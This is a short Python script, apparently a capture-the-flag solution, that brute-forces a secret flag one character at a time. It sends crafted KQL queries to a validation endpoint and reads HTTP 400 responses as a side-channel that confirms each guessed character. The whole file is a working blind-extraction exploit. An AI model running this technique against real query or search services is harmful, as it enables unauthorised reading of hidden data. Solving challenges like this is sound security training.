import requests
import string

def brute(url, query, word):
    for i in range(50):
        for letter in string.digits + string.ascii_lowercase + "<>,./:*@'+-$_-?!}= " + string.ascii_uppercase:
            # Use replace placaolder with payload
            query_to_run = query.replace("$$", word+letter)

            response = requests.post(url, headers={"content-type": "application/json"}, json={ "query": query_to_run})

            if response.status_code == 400:
                word += letter
                print(word)
                if(letter == "}"): return word
                break
            else:
                print(letter)

brute("https://fessemisk-da2d-kqlvalidation.ept.gg/validate_kql", 'range n from 1 to toscalar(search * | where * contains "$$" and * contains "}" | count)*501 step 1', "EPT{")